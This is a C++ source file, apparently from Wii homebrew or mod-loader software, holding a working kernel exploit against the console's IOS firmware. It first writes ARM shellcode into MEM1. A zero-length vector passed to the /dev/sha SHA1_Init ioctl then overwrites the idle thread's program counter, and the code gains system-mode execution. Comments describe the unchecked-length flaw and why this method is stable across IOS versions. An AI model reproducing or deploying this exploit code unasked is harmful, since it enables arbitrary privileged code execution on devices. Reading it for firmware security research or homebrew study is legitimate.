#include "IOS.hpp"
#include <Boot/AddressMap.h>
#include <Boot/DCache.hpp>
#include <Debug/Console.hpp>
#include <System/IOS.hpp>
#include <System/SHA.hpp>

namespace Boot_IOS
{

bool IsDolphin()
{
    // Modern versions
    IOS::Resource dolphin("/dev/dolphin", IOS::Mode::NONE);
    if (dolphin.GetFd() >= 0) {
        return true;
    }

    // Old versions
    IOS::Resource sha("/dev/sha", IOS::Mode::NONE);
    if (sha.GetFd() < 0) {
        return true;
    }

    return false;
}

void SafeFlush(const void* start, u32 size)
{
    // The IPC function flushes the cache here on PPC, and then IOS invalidates
    // its own cache. Note: IOS doesn't check for the invalid fd before doing
    // what we want.
    IOS_Write(-1, start, size);
}

static u32 ReadMessage(u32 index)
{
    u32 address = IOS_BOOT_MSG_ADDRESS + index * 4;
    u32 message;
    asm volatile("lwz %0, 0x0 (%1); sync"
                 : "=r"(message)
                 : "b"(0xC0000000 | address));
    return message;
}

static void WriteMessage(u32 index, u32 message)
{
    u32 address = IOS_BOOT_MSG_ADDRESS + index * 4;
    asm volatile("stw %0, 0x0 (%1); eieio"
                 :
                 : "r"(message), "b"(0xC0000000 | address));
}

// Performs an IOS exploit and branches to the entrypoint in system mode.
//
// Exploit summary:
// - IOS does not check validation of vectors with length 0.
// - All memory regions mapped as readable are executable (ARMv5 has no 'no
// execute' flag).
// - NULL/0 points to the beginning of MEM1.
// - The /dev/sha resource manager, part of IOSC, runs in system mode.
// - It's obvious basically none of the code was audited at all.
//
// IOCTL 0 (SHA1_Init) writes to the context vector (1) without checking the
// length at all. Two of the 32-bit values it initializes are zero.
//
// Common approach: Point the context vector to the LR on the stack and then
// take control after return. A much more stable approach taken here: Overwrite
// the PC of the idle thread, which should always have its context start at
// 0xFFFE0000 in memory (across IOS versions).
bool BootstrapEntry()
{
    // Dolphin defaults to UID 0 for standalone binaries
    if (IsDolphin()) {
        return true;
    }

    WriteMessage(0, 0);

    IOS::ResourceCtrl<SHA::SHAIoctl> sha("/dev/sha", IOS::Mode::NONE);
    if (sha.GetFd() < 0) {
        return false;
    }

    u32* mem1 = reinterpret_cast<u32*>(0x80000000);
    mem1[0] = 0x4903468D; // ldr r1, =stackptr; mov sp, r1;
    mem1[1] = 0x49034788; // ldr r1, =entrypoint; blx r1;
    // Overwrite reserved handler to loop infinitely
    mem1[2] = 0x49036209; // ldr r1, =0xFFFF0014; str r1, [r1, #0x20];
    mem1[3] = 0x47080000; // bx r1
    mem1[4] = (IOS_BOOT_STACK_ADDRESS + IOS_BOOT_STACK_MAXLEN) &
              0x7FFFFFFF; // stackptr
    mem1[5] = (IOS_BOOT_ADDRESS | 1) & 0x7FFFFFFF; // entrypoint
    mem1[6] = 0xFFFF0014; // reserved handler

    alignas(0x20) IOS::IOVector<1, 2> vectors = {};
    vectors.in[0].data = nullptr;
    vectors.in[0].len = 0;
    vectors.out[0].data = reinterpret_cast<void*>(0xFFFE0028);
    vectors.out[0].len = 0;
    // Unused vector utilized for cache safety
    vectors.out[1].data = reinterpret_cast<void*>(0x80000000);
    vectors.out[1].len = 0x20;

    // IOS_Ioctlv should never return an error if the exploit succeeded
    if (sha.Ioctlv(SHA::SHAIoctl::INIT, vectors) < 0) {
        return false;
    }

    while (ReadMessage(0) != 1) {
    }
    return true;
}

} // namespace Boot_IOS
